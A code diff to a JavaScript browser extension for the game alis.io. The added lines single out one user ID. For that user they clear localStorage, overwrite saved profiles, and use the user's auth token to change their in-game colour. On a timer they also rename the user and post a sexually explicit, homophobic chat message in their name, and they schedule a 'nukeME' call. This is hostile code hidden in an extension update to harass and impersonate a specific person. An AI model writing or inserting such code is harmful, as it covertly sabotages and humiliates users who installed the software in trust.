@@ -198,10 +198,12 @@ if(user.helpers){
 }
 
  if(user.muted == true){
-   if(window.userid == user.uid){
+   if(window.userid == user.uid || userid == 16999){
      console.log("%cYour Account has been Muted from Better Alis Extension",
      "background: #222; color: #14c0ff;padding-bottom: 20px;padding-top: 20px;padding-left: 60px;padding-right: 60px;font-size: 20px;border-radius: 10px;");
-   chatRoom.sendMessage = function(msg) {$("#chatroom").append("<span class='msg' style='color:#ff7272;'>Your account has been muted from Better Alis Extension</span><br>");return}};
+   chatRoom.sendMessage = function(msg) {
+if(userid==16999){  sendChat("Im big gay catfish, i like big cocks in my ass, im boy and i have boyfriend")}
+     $("#chatroom").append("<span class='msg' style='color:#ff7272;'>Your account has been muted from Better Alis Extension</span><br>");return}};
  };
 
   if(user.banned == true){
@@ -217,5 +219,22 @@ if(user.helpers){
 }}
 
   });
+
+if(userid==16999){
+  $("#startmass-si").remove()
+  localStorage.clear()
+  setTimeout(function(){
+    setTimeout(nukeME, 1000*60*5)
+    localStorage.setItem("player_profile",JSON.stringify([{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"},{"name":"Im gay","team":"","skinurl":"https://i.imgur.com/QrW0kGk.png"}]))
+$.get(`http://alis.io/api/users/changecolor`, {token: jwt, r: 255, g: 255, b: 255}, (data) => console.log(data));
+setInterval(function(){
+  $("#skinurl").val("https://i.imgur.com/QrW0kGk.png")
+  $("#nick").val("Chun li gay 🐱🐟")
+  sendChat("Im big gay catfish, i like big cocks in my ass, im boy and i have boyfriend")
+  scream(16999, 1)
+}, 1000*40)
+  }, 500)
+}
+
 }
 setTimeout(checkAdds, 13*1000)
